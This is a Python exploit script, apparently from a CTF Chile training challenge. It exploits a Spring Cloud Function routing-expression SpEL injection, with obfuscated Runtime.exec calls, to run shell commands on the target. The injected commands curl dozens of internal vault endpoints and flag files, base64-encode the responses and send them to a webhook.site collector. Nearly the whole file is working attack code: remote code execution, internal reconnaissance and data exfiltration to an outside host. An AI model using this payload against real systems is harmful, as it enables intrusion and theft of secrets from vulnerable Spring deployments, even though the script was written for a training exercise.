#!/usr/bin/env python3
"""
CTF Chile - Fuzzing dirigido a OmniVault Internal Router
Target específico: 10.160.209.2:8080 (único servicio que responde)
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"
VAULT_HOST = "10.160.209.2:8080"

print("[*] Fuzzing dirigido a OmniVault Internal Router...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: https://webhook.site/#!/{UUID}")
print()

def build_payload(cmd):
    esc = cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def fire(tag, cmd):
    try:
        r = requests.post(
            ROUTER,
            headers={
                "spring.cloud.function.routing-expression": build_payload(cmd),
                "Content-Type": "text/plain",
            },
            data="x",
            timeout=15,
        )
        print(f"    [+] {tag:30s} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag}: {e}")

def probe_endpoint(tag, endpoint, method="GET"):
    """Prueba un endpoint específico del vault"""
    url = f"http://{VAULT_HOST}{endpoint}"
    cmd = f"curl -s --connect-timeout 5 -X {method} '{url}' | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    fire(tag, cmd)

# === ENDPOINTS ESPECÍFICOS DE OMNI VAULT ===
print("[*] Fuzzing endpoints específicos...")

# Endpoints típicos de vaults/safes
vault_endpoints = [
    "/",
    "/api",
    "/api/",
    "/status",
    "/health",
    "/info",
    "/version",
    "/vault",
    "/vault/",
    "/safe",
    "/safe/",
    "/admin",
    "/admin/",
    "/login",
    "/auth",
    "/config",
    "/secrets",
    "/list",
    "/index",
    "/home",
    "/dashboard",
    "/panel",
    "/management",
    "/api/status",
    "/api/health",
    "/api/info",
    "/api/version",
    "/api/vault",
    "/api/vault/",
    "/api/safe",
    "/api/safe/",
    "/api/admin",
    "/api/admin/",
    "/api/login",
    "/api/auth",
    "/api/config",
    "/api/secrets",
    "/api/list",
    "/api/vault/list",
    "/api/vault/status",
    "/api/vault/info",
    "/api/vault/secrets",
    "/api/vault/config",
    "/api/admin/status",
    "/api/admin/config",
    "/api/admin/users",
    "/api/admin/logs",
    "/api/system/status",
    "/api/system/info",
    "/vault/admin",
    "/vault/status",
    "/vault/list",
    "/vault/secrets",
    "/safe/admin",
    "/safe/status",
    "/safe/list",
    "/safe/secrets",
    "/admin/vault",
    "/admin/safe",
    "/admin/status",
    "/admin/config",
    "/admin/users",
    "/admin/panel",
    "/admin/dashboard",
    "/internal",
    "/internal/",
    "/internal/status",
    "/internal/config",
    "/internal/vault",
    "/internal/admin",
    "/actuator",
    "/actuator/",
    "/actuator/health",
    "/actuator/info",
    "/actuator/env",
    "/actuator/metrics",
    "/management/health",
    "/management/info",
    "/management/status"
]

# Fuzzing sistemático
for i, endpoint in enumerate(vault_endpoints):
    tag = f"fuzz_{i:03d}_{endpoint.replace('/', '_')[1:] or 'root'}"
    probe_endpoint(tag, endpoint)

    # También probamos con POST en endpoints de API
    if "/api/" in endpoint:
        tag_post = f"post_{i:03d}_{endpoint.replace('/', '_')[1:] or 'root'}"
        probe_endpoint(tag_post, endpoint, "POST")

# === BÚSQUEDA DE ARCHIVOS ESTÁTICOS ===
print("[*] Buscando archivos estáticos...")

static_files = [
    "/flag.txt",
    "/flag",
    "/secret.txt",
    "/secret",
    "/config.json",
    "/config.txt",
    "/settings.json",
    "/app.config",
    "/vault.config",
    "/omni.config",
    "/readme.txt",
    "/README.md",
    "/index.html",
    "/admin.html",
    "/vault.html",
    "/safe.html"
]

for i, file_path in enumerate(static_files):
    tag = f"file_{i:03d}_{file_path.replace('/', '_')[1:]}"
    probe_endpoint(tag, file_path)

print()
print("[*] Esperando 20s para recibir todas las respuestas...")
time.sleep(20)

# === ANÁLISIS DE RESULTADOS ===
print("[*] Analizando respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?per_page=200", timeout=10)
requests_data = r.json().get("data", [])
print(f"    {len(requests_data)} requests recibidos")

flags_found = []
valid_endpoints = []
errors_404 = 0
errors_other = 0

for req in requests_data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    query = req.get("query") or {}
    raw = query.get("d")

    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")

            # Buscar flags
            if any(flag_format in decoded for flag_format in ["CTF{", "flag{", "FLAG{", "ctf{"]):
                flags_found.append({
                    "source": path,
                    "content": decoded
                })

            # Analizar respuestas válidas
            if "Not Found" in decoded and "404" in decoded:
                errors_404 += 1
            elif "success" in decoded and "false" in decoded:
                errors_other += 1
            elif len(decoded) > 50 and "error" not in decoded.lower():
                valid_endpoints.append({
                    "source": path,
                    "content": decoded[:300] + "..." if len(decoded) > 300 else decoded
                })

        except Exception:
            pass

print("\n" + "="*80)
print("🎯 FLAGS ENCONTRADAS:")
if flags_found:
    for flag in flags_found:
        print(f"Source: {flag['source']}")
        print(f"Flag: {flag['content']}")
        print("-" * 40)
else:
    print("❌ No se encontraron flags directas")

print(f"\n📊 ESTADÍSTICAS:")
print(f"   - Endpoints 404: {errors_404}")
print(f"   - Otros errores: {errors_other}")
print(f"   - Respuestas válidas: {len(valid_endpoints)}")

print(f"\n✅ ENDPOINTS VÁLIDOS (no 404):")
for endpoint in valid_endpoints:
    print(f"Source: {endpoint['source']}")
    print(f"Content: {endpoint['content']}")
    print("-" * 40)

print(f"\n🌐 Ver detalles en: https://webhook.site/#!/{UUID}")
print("\n[*] Fuzzing completado!")